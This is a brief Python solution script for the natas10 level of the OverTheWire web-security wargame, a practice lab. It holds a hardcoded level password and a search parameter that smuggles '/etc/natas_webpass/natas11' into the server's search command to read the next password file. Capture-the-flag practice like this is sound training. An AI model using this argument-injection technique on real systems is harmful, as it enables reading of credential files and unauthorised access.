import re
import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth('natas10', 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu')
def get_pass():
    param = {'needle':'c /etc/natas_webpass/natas11','submit':'Search'}
    r = requests.get('http://natas10.natas.labs.overthewire.org/', auth=auth, params=param)
    pass_regex = '[a-zA-Z0-9]{32}'
    print(re.findall(pass_regex,r.text)[1])
if __name__ == "__main__":
    get_pass()
